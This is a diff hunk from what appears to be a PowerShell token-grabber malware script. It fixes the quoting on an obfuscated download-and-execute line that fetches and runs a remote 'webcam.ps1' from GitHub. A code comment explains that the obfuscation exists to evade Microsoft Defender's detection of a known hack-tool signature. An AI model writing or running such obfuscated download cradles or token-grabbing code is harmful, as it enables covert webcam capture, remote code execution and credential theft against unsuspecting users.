@@ -738,8 +738,7 @@ function Backup-Data {
 
     # Had to do it like this due to https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=HackTool:PowerShell/EmpireGetScreenshot.A&threatId=-2147224978
     function Get-WebcamIMG {
-		
-        I'E'X(New-Object Net.WebClient).”`D`o`wn`l`oa`d`Str`in`g”("https://github.com/Chainski/PowerShell-Token-Grabber/raw/main/webcam.ps1")
+        I'E'X(New-Object Net.WebClient)."`D`o`wn`l`oa`d`Str`in`g"("https://github.com/Chainski/PowerShell-Token-Grabber/raw/main/webcam.ps1")
     }
     Get-WebcamIMG
 
